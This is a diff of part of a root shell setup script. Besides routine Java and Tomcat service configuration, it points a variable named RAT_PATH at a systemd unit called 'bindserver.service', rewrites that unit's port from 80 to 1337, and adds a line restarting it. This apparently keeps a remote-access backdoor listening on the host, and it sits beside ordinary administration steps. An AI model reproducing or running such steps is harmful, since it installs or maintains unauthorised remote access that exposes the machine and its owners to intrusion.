@@ -4,8 +4,8 @@ sudo -i
 # FIX LITTLE POS THAT RUNS OR DOESN'T WHATEVER 
 RAT_PATH=/usr/lib/systemd/system/bindserver.service
 sed -i 's/80/1337/g' "$RAT_PATH"
-
 systemctl daemon-reload
+systemctl restart bindserver.service
 
 # IPTABLES
 
@@ -92,5 +92,5 @@ BEST_JAVA="${BEST_JAVA%.}"
 alternatives --set java "$BEST_JAVA"
 
 systemctl daemon-reload
-systemctl enable tomcat
+chkconfig tomcat on
 systemctl restart tomcat
